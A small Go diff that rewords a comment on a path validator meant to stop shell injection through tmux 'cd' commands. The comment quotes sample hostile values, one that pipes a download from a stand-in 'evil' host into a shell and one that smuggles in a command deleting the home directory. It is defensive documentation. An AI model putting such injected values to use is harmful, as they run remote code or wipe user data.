@@ -289,7 +289,7 @@ func min3(a, b, c int) int {
 // ValidateSendDirPath rejects paths that, when interpolated into a
 // `cd %s\r` string and pasted into a tmux pane (which forwards bytes
 // verbatim to the pane's shell), would let the operator execute arbitrary
-// commands. The path arrives via the generic Agent.ExecuteCommand
+// commands. The path arrives via the concrete adapter's ExecuteCommand
 // interface (MCP server, workflow, supervisor) so the project's threat
 // model treats it as hostile. A value like `legitdir;curl evil|sh` or
 // `dir$(rm -rf ~)` would otherwise produce shell injection; embedded
